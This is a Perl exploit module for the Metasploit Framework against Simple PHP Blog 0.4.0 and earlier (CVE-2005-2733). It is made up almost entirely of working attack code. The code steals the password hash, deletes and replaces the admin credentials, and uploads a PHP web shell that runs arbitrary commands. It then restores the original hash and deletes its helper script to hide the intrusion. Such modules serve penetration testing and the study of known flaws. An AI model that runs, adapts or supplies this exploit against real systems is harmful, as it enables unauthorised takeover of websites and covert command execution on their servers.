
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::sphpblog_file_upload;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use bytes;

my $advanced = { };

my $info = {
	'Name'     => 'Simple PHP Blog remote command execution',
	'Version'  => '$Revision: 1.1 $',
	'Authors'  => [ 'Matteo Cantoni <goony@nothink.org>' ],
	'Arch'     => [ ],
	'OS'       => [ ],
	'Priv'     => 0,
	'UserOpts' =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'VHOST' => [0, 'DATA', 'The virtual host name of the server'],
		'DIR'   => [1, 'DATA', 'Sphpblog directory path', '/sphpblog'],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Description' => Pex::Text::Freeform(qq{
		The Simple PHP Blog (<= 0.4.0) application has two vulnerabilities present within
		it that when used together, can allow an attacker to arbitrarily upload
		files to the server. The first vulnerability has to do with insecure
		default file permissions and placement of config.txt and password.txt,
		and leaves both files fully accessible to unauthorized users.

		The second of the two vulnerabilities lies within the image upload
		system provided to (il?)legitimate, logged-in users. There is no image
		validation function in the blogger to stop an unauthorized user from
		uploading any file they want to to the server.

		Note: module based on "http://www.milw0rm.com/exploits/download/1191" script by Kenneth Belva.
}),

	'Refs' =>
	  [
		['OSVDB', '19011'],
		['BID', '14667'],
		['CVE', '2005-2733'],
		['URL', 'http://www.xorcrew.net/xpa/XPA-SimplePHPBlog.txt'],
		['MIL', '1191'],
	  ],

	'Payload' =>
	  {
		'Space' => 512,
		'Keys'  => ['cmd'],
	  },

	'Keys' => ['simple php blog'],

	'DisclosureDate' => 'August 25 2005',
  };

sub new{
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check{

	my $self = shift;
	my $target_host    = $self->VHost;
	my $target_port    = $self->GetVar('RPORT');
	my $dir            = $self->GetVar('DIR');

	my $url = "http://$target_host$dir/index.php";

	my $request =
	  "GET $url HTTP/1.1\r\n".
	  "Host: $target_host:$target_port\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "Connection: close\r\n".
	  "\r\n";

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr' => $target_host,
		'PeerPort' => $target_port,
		'SSL'      => $self->GetVar('SSL'),
	  );

	if ($s->IsError){
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($request);

	my $results = $s->Recv(-1, 10);

	$s->Close();

	if ($results =~ m/Simple PHP Blog (\d.\d.\d)/sm){
		my ($ver,$ver1,$ver2) = split(/\./,$1);

		if ($ver == 0){
			if ($ver1 < 5){
				if($ver2 > 0){
					if ($ver1 < 5){
						$self->PrintLine("[*] Simple PHP Blog appears to be vulnerable. (version $ver.$ver1.$ver2)");
					} else{
						$self->PrintLine("[*] Simple PHP Blog does not appear to be vulnerable. (version $ver.$ver1.$ver2)");
					}
				} else{
					$self->PrintLine("[*] Simple PHP Blog appears to be vulnerable. (version $ver.$ver1.$ver2)");
				}
			} else{
				$self->PrintLine("[*] Simple PHP Blog does not appear to be vulnerable. (version $ver.$ver1.$ver2)");
			}
		} else{
			$self->PrintLine("[*] Simple PHP Blog does not appear to be vulnerable. (version $ver.$ver1.$ver2)");
		}
	}
}

sub Exploit{
	my $self = shift;
	my $target_host    = $self->VHost;
	my $target_port    = $self->GetVar('RPORT');
	my $dir            = $self->GetVar('DIR');
	my $encodedPayload = $self->GetVar('EncodedPayload');
	my $cmd            = $encodedPayload->RawPayload;

	$cmd = $self->URLEncode($cmd);

	my ($user,$pass)   = "test";

	my $hash = $self->retrieve_password_hash($dir,$target_host,$target_port);
	$self->delete_password_file($dir,$target_host,$target_port);
	$self->create_new_password($user,$pass,$dir,$target_host,$target_port);
	my $session = $self->retrieve_session($user,$pass,$dir,$target_host,$target_port);
	$self->upload_cmd_page($session,$user,$pass,$dir,$target_host,$target_port);
	$self->reset_original_password($hash,$dir,$target_host,$target_port);
	$self->delete_reset_page($dir,$target_host,$target_port);
	$self->cmd_shell($cmd,$dir,$target_host,$target_port);
	return;
}

sub retrieve_password_hash{

	my ($self,$dir,$target_host,$target_port) = @_;
	my $url = "$dir/config/password.txt";

	my $request =
	  "GET $url HTTP/1.1\r\n".
	  "Host: $target_host:$target_port\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "Connection: close\r\n".
	  "\r\n";

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr' => $target_host,
		'PeerPort' => $target_port,
		'SSL'      => $self->GetVar('SSL'),
	  );

	if ($s->IsError){
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Establishing a connection to the target...");

	$s->Send($request);

	my $results = $s->Recv(-1, 10);
	my @results = split(/\r/, $results);

	$s->Close();

	my $hash;
	if (grep(/^HTTP\/1.1 200 OK/, @results)){
		$hash = $results[10];
		my $hash_length = length($hash);
		$self->PrintLine("[*] Retrieved username and password hash...");
		return $hash;
	} else {
		$self->PrintLine("[*] Error to retrieve username and password hash...");
	}
}

sub delete_password_file{

	my ($self,$dir,$target_host,$target_port) = @_;
	my $url = "$dir/comment_delete_cgi.php?y=05&m=08&comment=./config/password.txt";

	my $request =
	  "GET $url HTTP/1.1\r\n".
	  "Host: $target_host:$target_port\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "Connection: Close\r\n".
	  "\r\n";

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr' => $target_host,
		'PeerPort' => $target_port,
		'SSL'      => $self->GetVar('SSL'),
	  );

	if ($s->IsError){
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($request);

	my $results = $s->Recv(-1, 20);
	my @results = split(/\r/, $results);

	$s->Close();

	if (grep(/^HTTP\/1.1 302 Found/, @results)){
		$self->PrintLine("[*] Deleted password file...");
	} else {
		$self->PrintLine("[*] Error to delete password file...");
	}
}

sub create_new_password{

	my ($self,$user,$pass,$dir,$target_host,$target_port) = @_;
	my $url = "$dir/install03_cgi.php?blog_language=english";

	my $packet = "user=$user&pass=$pass&submit=\%C2\%A0Submit\%C2\%A0";
	my $packet_length = length($packet);

	my $request_newpass =
	  "POST $url HTTP/1.1\r\n".
	  "Host: $target_host:$target_port\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "Connection: Close\r\n".
	  "Content-Type: application/x-www-form-urlencoded\r\n".
	  "Content-Length: $packet_length\r\n\r\n".
	  "$packet\r\n".
	  "\r\n";

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr' => $target_host,
		'PeerPort' => $target_port,
		'SSL'      => $self->GetVar('SSL'),
	  );

	if ($s->IsError){
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($request_newpass);

	my $results = $s->Recv(-1, 20);
	my @results = split(/\r/, $results);

	$s->Close();

	if (grep(/^HTTP\/1.1 200 OK/, @results)){
		$self->PrintLine("[*] Modified password file...");
	} else {
		$self->PrintLine("[*] Error to modify password file...");
	}
}

sub retrieve_session{

	my ($self,$user,$pass,$dir,$target_host,$target_port) = @_;
	my $url = "$dir/login_cgi.php";

	my $packet = "user=$user&pass=$pass&submit=\%C2\%A0Submit\%C2\%A0";
	my $packet_length = length($packet);

	my $request =
	  "POST $url HTTP/1.1\r\n".
	  "Host: $target_host:$target_port\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "Connection: Close\r\n".
	  "Content-Type: application/x-www-form-urlencoded\r\n".
	  "Content-Length: $packet_length\r\n\r\n".
	  "$packet\r\n".
	  "\r\n";

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr' => $target_host,
		'PeerPort' => $target_port,
		'SSL'      => $self->GetVar('SSL'),
	  );

	if ($s->IsError){
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($request);

	my $results = $s->Recv(-1, 20);
	my @results = split(/\n/, $results);

	$s->Close();

	if (grep(/^HTTP\/1.1 200 OK/, @results)){
		$self->PrintLine("[*] Logged into Simple PHP Blog...");

		my $setcookie;
		foreach(@results){
			if ($_ =~ /^Set-Cookie: my_id=/){
				(undef,$setcookie) = split(/=/, $_);

				for ($setcookie) { s/^\r//; s/\r$//; }
				for ($setcookie) { s/^\n//; s/\n$//; }

				return $setcookie;
				$self->PrintLine("[*] Retrieved cookie... : $setcookie");
			}
		}
	} else {
		$self->PrintLine("[*] Error to login into Simple PHP Blog!");
	}
}

sub upload_cmd_page{

	my ($self,$session,$user,$pass,$dir,$target_host,$target_port) = @_;
	my $url = "$dir/upload_img_cgi.php";

	my %packets = (
		'cmd.php'   => "--xYzZY\r\nContent-Disposition: form-data; name=\"userfile\"; filename=\"cmd.php\"\r\nContent-Type: text/plain\r\n\r\n".
		  "<?php \$cmd = \$_GET['cmd']; echo '<hr><pre>'; echo 'Command: '.\$cmd;echo '</pre><hr><br>';echo '<pre>'; \$last_line = system(\$cmd,\$output);".
		  "echo '</pre><br><hr/>'; ?>\r\n--xYzZY--",
		'reset.php' => "--xYzZY\r\nContent-Disposition: form-data; name=\"userfile\"; filename=\"reset.php\"\r\nContent-Type: text/plain\r\n\r\n".
		  "<?php \$hash = \$_POST['hash']; \$fp = fopen(\"../config/password.txt\",\"w\");fwrite(\$fp,\$hash); fpclose(\$fp); ?>\r\n--xYzZY--"
	  );

	my @phpfiles = ("cmd.php","reset.php");

	foreach my $phpfile(@phpfiles){

		my $packet = $packets{$phpfile};
		my $packet_length = length($packet);

		my $request =
		  "POST $url HTTP/1.1\r\n".
		  "Host: $target_host:$target_port\r\n".
		  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
		  "Connection: Close\r\n".
		  "Content-Length: $packet_length\r\n".
		  "Content-Type: multipart/form-data; boundary=xYzZY\r\n".
		  "Cookie: PHPSESSID=$session; my_id=$session\r\n\r\n".
		  "$packet\r\n".
		  "\r\n";

		my $s = Msf::Socket::Tcp->new(
			'PeerAddr' => $target_host,
			'PeerPort' => $target_port,
			'SSL'      => $self->GetVar('SSL'),
		  );

		if ($s->IsError){
			$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
			return;
		}

		$s->Send($request);

		my $results = $s->Recv(-1, 20);
		my @results = split(/\r/, $results);

		$s->Close();

		if (grep(/^HTTP\/1.1 302 Found/, @results)){
			$self->PrintLine("[*] Upload $phpfile script on target...");
			$self->PrintLine("[*] To run command please go to http://$target_host$dir/images/cmd.php?cmd=[your command]") if ($phpfile =~ 'cmd.php');
		} else {
			$self->PrintLine("[*] Error to upload $phpfile script on target...");
		}
	}
}

sub reset_original_password{

	my ($self,$hash,$dir,$target_host,$target_port) = @_;
	my $url = "$dir/images/reset.php";

	for ($hash) { s/^\n//; s/\n$//; }

	my $request =
	  "POST $url HTTP/1.1\r\n".
	  "Host: $target_host:$target_port\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "Connection: Close\r\n".
	  "Content-Length: 45\r\n".
	  "Content-Type: application/x-www-form-urlencoded\r\n\r\n".
	  "hash=$hash";

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr' => $target_host,
		'PeerPort' => $target_port,
		'SSL'      => $self->GetVar('SSL'),
	  );

	if ($s->IsError){
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($request);
	$s->Close();

	$self->PrintLine("[*] Reset original password...");
}

sub delete_reset_page{

	my ($self,$dir,$target_host,$target_port) = @_;
	my $url = "$dir/comment_delete_cgi.php?y=05&m=08&comment=./images/reset.php";

	my $request =
	  "GET $url HTTP/1.1\r\n".
	  "Accept: */*\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "Host: $target_host:$target_port\r\n".
	  "Connection: Close\r\n".
	  "\r\n";

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr' => $target_host,
		'PeerPort' => $target_port,
		'SSL'      => $self->GetVar('SSL'),
	  );

	if ($s->IsError){
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($request);

	my $results = $s->Recv(-1, 20);
	my @results = split(/\r/, $results);

	$s->Close();

	if (grep(/^HTTP\/1.1 302 Found/, @results)){
		$self->PrintLine("[*] Removed reset.php from target host...");
	} else {
		$self->PrintLine("[*] Error to removed reset.php from target host...");
	}
}

sub cmd_shell{

	my ($self,$cmd,$dir,$target_host,$target_port) = @_;
	my $url = "$dir/images/cmd.php?cmd=$cmd";

	my $request =
	  "GET $url HTTP/1.1\r\n".
	  "Accept: */*\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
	  "Host: $target_host:$target_port\r\n".
	  "Connection: Close\r\n".
	  "\r\n";

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr' => $target_host,
		'PeerPort' => $target_port,
		'SSL'      => $self->GetVar('SSL'),
	  );

	if ($s->IsError){
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($request);

	my $results = $s->Recv(-1, 20);

	$s->Close();

	if ($results =~ /HTTP\/1.1 200 OK/){
		my (undef,$res) = split(/<br><pre>/, $results);
		my ($res2,undef) = split(/<\/pre><br>/, $res);
		$self->PrintLine("[*] Run command '$cmd'...");
		print "\n$res2\n";
	} else{
		$self->PrintLine("[*] Error to run command...");
	}
}

sub URLEncode{
	my $self = shift;
	my $data = shift;
	my $res;

	foreach my $c (unpack('C*', $data)) {
		if (
			($c >= 0x30 && $c <= 0x39) ||
			($c >= 0x41 && $c <= 0x5A) ||
			($c >= 0x61 && $c <= 0x7A)
		  ) {
			$res .= chr($c);
		} else {
			$res .= sprintf("%%%.2x", $c);
		}
	}
	return $res;
}

sub VHost{
	my $self = shift;
	my $name = $self->GetVar('VHOST') || $self->GetVar('RHOST');
	return $name;
}

1;
